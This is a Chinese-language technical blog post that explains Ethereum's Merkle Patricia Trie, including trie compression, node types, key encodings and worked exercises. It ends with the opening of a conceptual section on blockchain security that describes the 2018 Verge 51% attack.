<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123; &quot;0000000000000000000000000000000000000001&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000002&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000003&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000004&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;102e61f5d8f9bc71d0ad4a084df4e65e05ce0e1c&quot;: &#123; &quot;balance&quot;: &quot;1606938044258990275541962092341162602522202993782792835301376&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>不同于交易历史记录，状态树需要经常地进行更新：账户余额和账户的随机数nonce经常会更变，更重要的是，新的账户会频繁地插入，存储的键（ key）也会经常被插入以及删除。MPT的数据结构设计，使得我们可以在一次插入、更新编辑或者删除操作之后，快速地计算出新的树根（tree root），而无需重新计算整颗树。此外，它还有两个非常好的特性：</p>
<ol>
<li>树的深度是有限制的。考虑到攻击者会故意地制造一些交易，使得这棵树尽可能地深，从而可以通过操纵树的深度，执行拒绝服务攻击（DOS attack），使得更新变得极其缓慢。</li>
<li>树的根只取决于数据，和其中的更新顺序无关。换个顺序进行更新，甚至重新从头计算树，并不会改变根。</li>
</ol>
<p><strong>帕特里夏树（Patricia Trees）（压缩前缀树）</strong></p>
<p>Merkle Patricia Tree（又称为Merkle Patricia Trie）是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。</p>
<p>MPT结合了（1）radix trie (patricia)（2）Merkle tree两种树结构的特点与优势 ，因为Merkle树之前已经详细介绍过，所以这里直接讨论前缀树以及压缩前缀树（patricia树）。</p>
<p>Trie树，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>
<p>下面这棵trie包含这样一组单词，inn, int, at, age, adv, ant 每个节点存储的是字符串中的部分字符，每个从根到某个节点的路径（不一定到叶子节点）代表了一个存储的字符串，如果想查找adv是否存在，只需要走红圈这样的路径即可。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233079.jpg" alt="img"></p>
<p>Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。它有3个基本性质：</p>
<ol>
<li>根节点不包含字符，除根节点外每一个节点都只包含一个字符。</li>
<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>
<li>每个节点的所有子节点包含的字符都不相同。</li>
</ol>
<p>典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较。举个具体的例子：</p>
<p>题目：给你100000个长度不超过10的单词。对于每一个单词，我们要判断它出没出现过，如果出现了，求第一次出现在第几个位置。<br>分析：这题当然可以用hash来解决，但是比如说对于某一个单词，我们要询问它的前缀是否出现过。这样hash就不太适用，而用trie还是很简单。<br>现在回到例子中，如果我们用最朴实的方法，对于每一个单词，我们都要去查找它前面的单词中是否有它。那么这个算法的复杂度就是O(n^2)。显然对于100000的范围难以接受。现在我们换个思路想。假设我要查询的单词是abcd，那么在前面的单词中，以b，c，d，f之类开头的显然不必考虑。而只要找以a开头的中是否存在abcd就可以了。同样的，在以a开头中的单词中，我们只要考虑以b作为第二个字母的，一次次缩小范围和提高针对性，这样一个树的模型就渐渐清晰了。<br>好比假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233080.jpg" alt="img"></p>
<p>如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是10。</p>
<p>以上只是简化表示，实际上，trie每个节点是一个确定长度的数组，数组中每个节点的值是一个指向子节点的指针，最后有个标志域，标识这个位置为止是否是一个完整的字符串。从这个意义上讲，trie树每一层的节点数是26^i级别的，但实际上并没有这么多，很多位置的相应指针为空。</p>
<p>常见的用来存英文单词的trie每个节点是一个长度为27的指针数组，index0-25代表a-z字符，26为标志域。如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233081.jpg" alt="img"></p>
<p>缺点：</p>
<ul>
<li>直接查找效率较低</li>
</ul>
<p>前缀树的查找效率是O(m)，m为所查找节点的key长度，而哈希表的查找效率为O(1)。且一次查找会有m次IO开销，相比于直接查找，无论是速率、还是对磁盘的压力都比较大。</p>
<ul>
<li>可能会造成空间浪费</li>
</ul>
<p>当存在一个节点，其key值内容很长（如一串很长的字符串），当树中没有与他相同前缀的分支时，为了存储该节点，需要创建许多非叶子节点来构建根节点到该节点间的路径，造成了存储空间的浪费。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233082.jpg" alt="img"></p>
<p><strong>对前缀树的改进：Patricia树</strong></p>
<p>Patricia trie，压缩前缀树，是一种更节省空间的Trie。对于基数树的每个节点，如果该节点是唯一的儿子的话，就和父节点合并。</p>
<p>如之前所提及的，前缀树中会出现严重的存储空间浪费的情况，如上图。图中右侧有一长串节点，这些节点大部分只是充当非叶子节点，用来构建一条路径，目的只是为了存储该路径上的叶子节点。</p>
<p>针对这种情况，MPT树对此进行了优化：当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把<strong>剩余的Key</strong>存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。</p>
<p>下图中对应着将5个单词test、toaster、toasting、slow、slowly插入到树中，其中有三个单词共享t前缀，两个单词共享s前缀，t和s不同，所以在根节点上有两个分支。在左边的分支（t）上，有两个分支，而且est是没有和其他任何单词共享前缀，也即父节点只有一个孩子，则est可以被压缩。类似地oast和slow以及ly可以进行压缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233083.jpg" alt="img"></p>
<p>这种做法有以下几点优势：</p>
<ul>
<li>提高节点的查找效率，避免过多的磁盘访问；</li>
<li>减少存储空间浪费，避免存储无用的节点；</li>
</ul>
<p>另外，再看一个例子，这种树可以用来存键值对，key就是路径上的字符串，value的值存储在叶子节点。：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233084.jpg" alt="img"></p>
<p>树中所存储的键值对：</p>
<ul>
<li>6c0a5c71ec20bq3w &#x3D;&gt; 5</li>
<li>6c0a5c71ec20CX7j &#x3D;&gt; 27</li>
<li>6c0a5c71781a1FXq &#x3D;&gt; 18</li>
<li>6c0a5c71781a9Dog &#x3D;&gt; 64</li>
<li>6c0a8f743b95zUfe &#x3D;&gt; 30</li>
<li>6c0a8f743b95jx5R &#x3D;&gt; 2</li>
<li>6c0a8f740d16y03G &#x3D;&gt; 43</li>
<li>6c0a8f740d16vcc1 &#x3D;&gt; 48</li>
</ul>
<p>就以太坊而言，状态树的键 &#x2F; 值映射是地址与相关账户之间的映射，即指向每个账户的 balance、nonce、codeHash 和 storageRoot。</p>
<hr>
<p><strong>在以太坊中的MPT树中，树节点可以分为以下四类：</strong></p>
<ul>
<li>空节点：(represented as the empty string)</li>
<li>分支节点：A 17-item node<code>[ v0 ... v15, vt ]</code></li>
<li>叶子节点：A 2-item node<code>[ encodedPath, value ]</code></li>
<li>扩展节点：A 2-item node<code>[ encodedPath, key ]</code></li>
</ul>
<p>空节点，简单的表示空，在代码中是一个空串。</p>
<p>叶子节点（leaf），表示为[key,value]的一个键值对，其中key是key的一种特殊十六进制编码，value是value的RLP编码。</p>
<p>扩展节点（extension），也是[key，value]的一个键值对，但是这里的value是其他节点的hash值，这个hash可以被用来查询数据库中的节点。也就是说通过hash链接到其他节点。</p>
<p>分支节点（branch），因为MPT树中的key被编码成一种特殊的16进制的表示，再加上最后的value，所以分支节点是一个长度为17的list，前16个元素对应着key中的16个可能的十六进制字符，如果有一个[key,value]对在这个分支节点终止，最后一个元素代表一个值，即分支节点既可以搜索路径的终止也可以是路径的中间节点。</p>
<p><strong>分支节点</strong></p>
<p>分支节点用来表示MPT树中所有拥有超过1个孩子节点以上的非叶子节点， 其定义如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type fullNode struct &#123;</span><br><span class="line">        Children [17]node // Actual trie node data to encode/decode (needs custom encoder)</span><br><span class="line">        flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// nodeFlag contains caching-related metadata about a node.</span><br><span class="line">type nodeFlag struct &#123;</span><br><span class="line">    hash  hashNode // cached hash of the node (may be nil)</span><br><span class="line">    gen   uint16   // cache generation counter</span><br><span class="line">    dirty bool     // whether the node has changes that must be written to the database</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与前缀树相同，MPT同样是把key-value数据项的key编码在树的路径中，但是key的每一个字节值的范围太大（[0-127]），因此在以太坊中，在进行树操作之前，首先会进行一个key编码的转换（下节会详述），将一个字节的高低四位内容分拆成两个字节存储。通过编码转换，<code>key&#39;</code>的每一位的值范围都在[0, 15]内。因此，一个分支节点的孩子至多只有16个。以太坊通过这种方式，减小了每个分支节点的容量，但是增加了树高。</p>
<p>分支节点的孩子列表中，最后一个元素是用来存储自身的内容。</p>
<p>此外，每个分支节点会有一个附带的字段<code>nodeFlag</code>，记录了一些辅助数据：</p>
<ul>
<li>节点哈希：若该字段不为空，则当需要进行哈希计算时，可以跳过计算过程而直接使用上次计算的结果（当节点变脏时，该字段被置空）；</li>
<li>脏标志：当一个节点被修改时，该标志位被置为1；</li>
<li>诞生标志：当该节点第一次被载入内存中（或被修改时），会被赋予一个计数值作为诞生标志，该标志会被作为节点驱除的依据，清除内存中“太老”的未被修改的节点，防止占用的内存空间过多；</li>
</ul>
<p><strong>叶子节点&amp;&amp;扩展节点</strong></p>
<p>叶子节点与扩展节点的定义相似，如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type shortNode struct &#123;</span><br><span class="line">        Key   []byte</span><br><span class="line">        Val   node</span><br><span class="line">        flags nodeFlag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中关键的字段为：</p>
<ul>
<li>Key：用来存储***属于该节点范围的key***；</li>
<li>Val：用来存储该节点的内容；</li>
</ul>
<p>其中<code>Key</code>是MPT树实现树高压缩的关键。当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把***剩余的Key***存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。【可以结合上面toasting的例子】</p>
<p>此外Val字段用来存储叶子／扩展节点的内容，对于叶子节点来说，该字段存储的是一个数据项的内容；而对于扩展节点来说，该字段可以是以下两种内容：</p>
<ol>
<li>Val字段存储的是其孩子节点在数据库中存储的索引值（其实该索引值也是孩子节点的哈希值）；</li>
<li>Val字段存储的是其孩子节点的引用；</li>
</ol>
<p>由于叶子&#x2F;扩展节点共享一套定义，那么怎么来区分Val字段存储的到底是一个数据项的内容，还是一串哈希索引呢？在以太坊中，通过在Key中加入特殊的标志来区分两种类型的节点。</p>
<h2 id="还有一个重要的概念是：key值编码"><a href="#还有一个重要的概念是：key值编码" class="headerlink" title="还有一个重要的概念是：key值编码"></a><strong>还有一个重要的概念是：key值编码</strong></h2><p>在以太坊中，MPT树的key值共有三种不同的编码方式，以满足不同场景的不同需求，在这里单独作为一节进行介绍。</p>
<p>三种编码方式分别为：</p>
<ol>
<li>Raw编码（原生的字符）；</li>
<li>Hex编码（扩展的16进制编码）；</li>
<li>Hex-Prefix编码（16进制前缀编码）；</li>
</ol>
<h3 id="Raw编码"><a href="#Raw编码" class="headerlink" title="Raw编码"></a>Raw编码</h3><p>Raw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。</p>
<blockquote>
<p>例如一条key为“cat”，value为“dog”的数据项，其Raw编码就是[‘c’, ‘a’, ‘t’]，换成ASCII表示方式就是[63, 61, 74]</p>
</blockquote>
<h3 id="Hex编码"><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h3><p>在介绍分支节点的时候，我们介绍了，为了减少分支节点孩子的个数，需要将key的编码进行转换，将原key的高低四位分拆成两个字节进行存储。这种转换后的key的编码方式，就是Hex编码。</p>
<p>从Raw编码向Hex编码的转换规则是：</p>
<ul>
<li>将Raw编码的每个字符，根据高4位低4位(nibble)拆成两个字节；</li>
<li>若该Key对应的节点存储的是真实的数据项内容（即该节点是叶子节点），则在末位添加一个ASCII值为16的字符作为终止标志符；</li>
<li>若该key对应的节点存储的是另外一个节点的哈希索引（即该节点是扩展节点），则不加任何字符；</li>
</ul>
<blockquote>
<p>key为“cat”, value为“dog”的数据项，其Hex编码为[6, 3, 6, 1, 7, 4, 10]</p>
</blockquote>
<p><em>Hex编码用于对内存中MPT树节点key进行编码</em></p>
<h3 id="HP编码"><a href="#HP编码" class="headerlink" title="HP编码"></a>HP编码</h3><p>MPT树中另外一个重要的概念是一个特殊的十六进制前缀(hex-prefix, HP)编码，用来对key进行编码。因为有两种[key,value]节点(叶节点和扩展节点)，所以需要对它们进行区分。此时，引进一种特殊的标识（一个bit即可）来标识key所对应的是值是叶子，还是其他节点的hash。如果标识符是1，那么key对应的是叶节点，反之则是扩展节点。</p>
<p>另外需要注意的一点是，在某个节点处，当前路径的长度可能是奇数。此时会面临的一个问题是，因为路径本身是按照4位，也即一个nibble为单位的，但是存储的时候总是以字节为单位的。假设当前有两个路径分别是‘136’和‘0136’，在存储的时候是没有办法区分的，因为以字节为单位进行存储的时候，总是会转化为01 + 36两个字节。所以，在HP编码中，还必须有一个标识进行路径长度奇偶性的标识。【注：要结合下面具体的例子看，这里的路径不是从根到叶子的完整的路径（总是偶数），而是当前在叶子节点&#x2F;扩展节点中存储的路径的长度】</p>
<p>所以在MPT树中，对每个路径（叶子节点首先移除末尾的16），总是要首先加上一个nibble，这个Nibble的最低位表示节点路径长度奇偶性，第二低位表示节点的性质。</p>
<p>如果key是偶数长度，那么因为又加了一个四个比特，所以需要加上另外一个值为0的nibble，使得整体长度为偶数。</p>
<p>HP编码的规则如下：</p>
<ul>
<li>若原key的末尾字节的值为16（即该节点是叶子节点），去掉该字节；</li>
<li>在key之前增加一个半字节，其中最低位用来编码原本key长度的奇偶信息，key长度为奇数，则该位为1；低2位中编码一个特殊的终止标记符，若该节点为叶子节点，则该位为1；</li>
<li>若原本key的长度为偶数，则在key之前再增加一个值为0x0的<strong>半字节</strong>；</li>
<li>将原本key的内容作压缩，即将两个字符以高4位低4位进行划分，存储在一个字节中（Hex扩展的逆过程）；</li>
</ul>
<blockquote>
<p>若Hex编码为[6, 3, 6, 1, 7, 4, 10]，则HP编码的值为[20, 63, 61, 74]</p>
</blockquote>
<p>所添加的nibble的值和所对应的节点的路径的性质表如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hex char    bits    |    node type partial     path length</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">   0        0000    |       extension              even        </span><br><span class="line">   1        0001    |       extension              odd         </span><br><span class="line">   2        0010    |   terminating (leaf)         even        </span><br><span class="line">   3        0011    |   terminating (leaf)         odd</span><br></pre></td></tr></table></figure>

<p>根据bits可以判断出节点的类型和搜索路径长度的奇偶性。0000，查看最后两位的情况，倒数第二位是0，说明是extension节点；最后一位是0，说明路径长度是偶数。0011，最后两位的值是11，第二低位是1说明是扩展节点，最后一位是1说明路径长度为奇数。剩下两种情况类似可分析。</p>
<p><strong>转换关系</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233085.jpg" alt="img"></p>
<p>以上三种编码方式的转换关系为：</p>
<ul>
<li>Raw编码：原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码；</li>
<li>Hex编码：16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码；</li>
<li>HP编码：16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码；</li>
</ul>
<p>下面结合一个具体的例子再来描述一遍这个过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233086.jpg" alt="img">官方示例</p>
<p>在上图中，共有四个键值对。四个key有共同的前缀a7，因此，第一个节点（也是root节点）是一个扩展节点。之后接下来有三个分支，分别是1、7和f。因此，扩展节点之后跟着一个分支节点，分支节点中有三个分支。其中分支1和7之后只有一个节点，因此直接到达了叶子节点。分支7之后有两个节点，并且这两个节点有共同的前缀‘d3’，所以分支7连着一个扩展节点。扩展节点之后有两个分支，3和9，因此再跟上一个分支节点。分支节点之后是两个叶子节点。</p>
<p>然后再分析一下前缀的情况。在路径为’a7’的扩展节点中，路径长度为偶数，本身为扩展节点，因此，第一个nibble为0000，长度为偶数，添加一个nibble 0000，前缀应该为00。第二层的两个叶子节点，长度都为偶数，所以第一个nibble是0010，再添加一个nibble 0000,所以最终前缀应该为20。第二层中的扩展节点，同样长度为偶数，所以前缀应该是00。最后一层的叶子节点中，长度为奇数，所以添加的nibble是0011，也即3。</p>
<p>练习：</p>
<p>完成下列节点的Hex编码到HP编码。</p>
<p>&gt; [ 1, 2, 3, 4, 5, …] 【扩展结点，路径长度为奇数，添加01（bit），也即1(nibble)】<br>‘11 23 45’<br>&gt; [ 0, 1, 2, 3, 4, 5, …]【扩展结点，路径长度为偶数，添加00，也即0，然后补一个0000】<br>‘00 01 23 45’<br>&gt; [ 0, f, 1, c, b, 8, 10] 【叶子节点，长度为偶数（最后一个10也即16，补充位，需要移除），添加10，也即2，然后补0000，也即0】<br>‘20 0f 1c b8’<br>&gt; [ f, 1, c, b, 8, 10] 【叶子节点，长度为奇数，添加11，也即3】<br>‘3f 1c b8’</p>
<p>请画出下面的MPT。</p>
<p>Suppose we want a trie containing four path&#x2F;value pairs <code>(&#39;do&#39;, &#39;verb&#39;)</code>, <code>(&#39;dog&#39;, &#39;puppy&#39;)</code>, <code>(&#39;doge&#39;, &#39;coin&#39;)</code>, <code>(&#39;horse&#39;, &#39;stallion&#39;)</code>.</p>
<p>First, we convert both paths and values to <code>bytes</code>. Below, actual byte representations for <em>paths</em>are denoted by <code>&lt;&gt;</code>, although <em>values</em> are still shown as strings, denoted by <code>&#39;&#39;</code>, for easier comprehension (they, too, would actually be <code>bytes</code>):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;64 6f&gt; : &#x27;verb&#x27;</span><br><span class="line">&lt;64 6f 67&gt; : &#x27;puppy&#x27;</span><br><span class="line">&lt;64 6f 67 65&gt; : &#x27;coin&#x27;</span><br><span class="line">&lt;68 6f 72 73 65&gt; : &#x27;stallion&#x27;</span><br></pre></td></tr></table></figure>

<p>Now, we build such a trie with the following key&#x2F;value pairs in the underlying DB:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">rootHash: [ &lt;16&gt;, hashA ]</span><br><span class="line">hashA:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashB, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashC, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt; ]</span><br><span class="line">hashC:    [ &lt;20 6f 72 73 65&gt;, &#x27;stallion&#x27; ]</span><br><span class="line">hashB:    [ &lt;00 6f&gt;, hashD ]</span><br><span class="line">hashD:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashE, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;verb&#x27; ]</span><br><span class="line">hashE:    [ &lt;17&gt;, hashF ]</span><br><span class="line">hashF:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashG, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;puppy&#x27; ]</span><br><span class="line">hashG:    [ &lt;35&gt;, &#x27;coin&#x27; ]</span><br></pre></td></tr></table></figure>

<p>以上四个键，共享一个公共前缀6，所以第一个节点应该是扩展节点，其后4和8有两个分支，因此扩展节点之后跟着分支节点，其中第一个分支节点4之后有三个有共同前缀‘6f’键值对，所以分支4之后是一个扩展节点。而8之后只有一个节点，所以8之后是一个叶子节点。4之后的扩展节点有共同前缀‘6f’，‘6f‘之后有两种情况，分别是空和‘6’。所以该扩展节点之后跟着分支节点。分支节点中6之后跟着扩展节点，因为有两个键值对共享7前缀。空的位置则对应着‘verb’值本身。6之后的扩展节点的共享前缀是’7’，7之后有两种情况，分别是空和’6’。类似地，空的位置对应着单词’puppy’；分支6之后对应着叶子节点‘coin’。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233087.jpg" alt="img"></p>
<p>最后，再构造好Particia树之后，是怎么样和Merkle树结合起来了呢？这里主要是如上所示，对所有的节点的值都做了Hash。</p>
<p>增加一个练习：</p>
<p>Whenever a new item is added to the trie the algorithm can decide whether to insert a branch, a leaf or an extension. Let’s say you need to insert 3 key-value pairs:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;0x01&quot;: 1</span><br><span class="line">&quot;0x01234&quot;: 2</span><br><span class="line">&quot;0x01235&quot;: 3</span><br></pre></td></tr></table></figure>

<p>After “0x01” is inserted the trie will look like this (<code>hash0</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash0&gt; leaf [&quot;0x01&quot;, 1]</span><br></pre></td></tr></table></figure>

<p>After “0x01234” is inserted (<code>hash1</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash1&gt; extension [&quot;0x01&quot;, &lt;hash2&gt;]</span><br><span class="line">&lt;hash2&gt; branch [NULL,NULL,&lt;hash3&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash3&gt; leaf [&quot;0x34&quot;, 2]</span><br></pre></td></tr></table></figure>

<p>After “0x01235” is inserted (<code>hash4</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash4&gt; extension [&quot;0x01&quot;, &lt;hash5&gt;]</span><br><span class="line">&lt;hash5&gt; branch [NULL,NULL,&lt;hash6&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash6&gt; extension [&quot;0x3&quot;, &lt;hash7&gt;]</span><br><span class="line">&lt;hash7&gt; branch [NULL,NULL,NULL,NULL,&lt;hash8&gt;,&lt;hash9&gt;..&lt;10 NULLs&gt;.., NULL]</span><br><span class="line">&lt;hash8&gt; leaf [&quot;&quot;, 2]</span><br><span class="line">&lt;hash9&gt; leaf [&quot;&quot;, 3]</span><br></pre></td></tr></table></figure>

<p>Generally, while inserting a key-value pair:</p>
<ul>
<li>if you stopped at a NULL node, you add a new leaf node with the remaining path and replace NULL with the hash of the new leaf.</li>
<li>if you stopped at a leaf node, you need to convert it to an extension node and add a new branch and 1 or 2 leafs.</li>
<li>if you stopped at an extension node, you convert it to another extension with shorter path and create a new branch and 1 or 2 leafs. If the new path turns out to be empty you convert it to a branch instead.</li>
</ul>
<p>When deleting a key-value pair:</p>
<ul>
<li>if there is a branch that has a single non NULL nibble and NULL value, this branch can be replaced with a leaf or an extension.</li>
<li>if there is an extension that points to another extension or a leaf, it can be collapsed into a single extension&#x2F;leaf.</li>
<li>if there is branch with all NULL nibbles and non NULL value, it can be converted into a leaf.</li>
</ul>
<p>I most likely missed a few cases but I hope the general idea is clear. When adding&#x2F;deleting key-value pairs the algorithm can make the decision locally at the current node, there is no need to create an unpacked version of the trie first and then pack it.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">EthFans | 以太坊爱好者</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/wiki/wiki/Patricia-Tree">ethereum&#x2F;wiki</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/73758">谈谈以太坊的Merkle树_巴比特_服务于区块链创新者</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_33935254/article/details/55505472">深入浅出以太坊MPT（Merkle Patricia Tree）</a></li>
<li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000016050921">以太坊源码分析 MPT - SegmentFault</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview/">https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview&#x2F;</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/754796689749.htm">https://www.chainnews.com/articles/754796689749.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more">https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more</a></li>
<li><a href="https://link.zhihu.com/?target=http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/">http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.infoq.cn/article/how-does-ethereum-work-anyway">https://www.infoq.cn/article/how-does-ethereum-work-anyway</a></li>
<li><a href="https://link.zhihu.com/?target=https://harry.uno/post/merkle-patricia-tree.html">https://harry.uno/post/merkle-patricia-tree.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/">https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed">https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/e67452930dcc">https://www.jianshu.com/p/e67452930dcc</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/luosongchao/p/3239521.html">https://www.cnblogs.com/luosongchao/p/3239521.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node">https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/">http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28928827">https://zhuanlan.zhihu.com/p/28928827</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hellobtc.com/kp/kc/201904/1562.html">https://www.hellobtc.com/kp/kc/201904/1562.html</a></li>
</ol>
<h1 id="区块链技术12：区块链安全（1）"><a href="#区块链技术12：区块链安全（1）" class="headerlink" title="区块链技术12：区块链安全（1）"></a>区块链技术12：区块链安全（1）</h1><p>在引入比特币等加密货币时，一个经常提及的概念是支撑着这些加密货币的底层框架——区块链协议非常地安全可靠。各种加密算法保证了区块链的正常运行，区块链中的信息不可篡改、不能删除，基于工作量的证明保证难以有攻击者可以控制网络。在这些良好性质的支持下，加密货币系统得到了快速的发展。</p>
<p>但是，对加密货币的绝对安全的期望是错误的。接下来，我们将看一些具体的例子，查看其中加密货币系统是如何被攻击的。第一个例子，攻击者针对的是区块链的底层运行算法；第二个例子，攻击者利用的则是区块链上智能合约的编写。</p>
<h2 id="verge"><a href="#verge" class="headerlink" title="verge"></a>verge</h2><p>verge是一种规模相对较小的加密货币。在2018年4月 4 日至 6 日这段时间里，黑客成功地控制了 Verge 网络三次，每次持续几个小时，在此期间，黑客阻止了任何其他用户进行支付。而且在此期间他们能够以 1560 枚每秒（大约 $80）的速度伪造 Verge 币，共伪造价值超百万美元的 Verge 币。</p>
<p>看到这个攻击效果时，我们来想一想，什么样的攻击能够达到这个效果？</p>
<p>其他用户完全不能支付，也就意味着这些用户产生的交易始终不能被打包到区块中，不能获得确定，从而相当于是不能进行支付。如何伪造Verge币呢？持续产生区块就行。那如何能持续产生区块呢？那就要比其他用户更快地产生区块。换言之，就是要控制网络中超过51%的算力。</p>
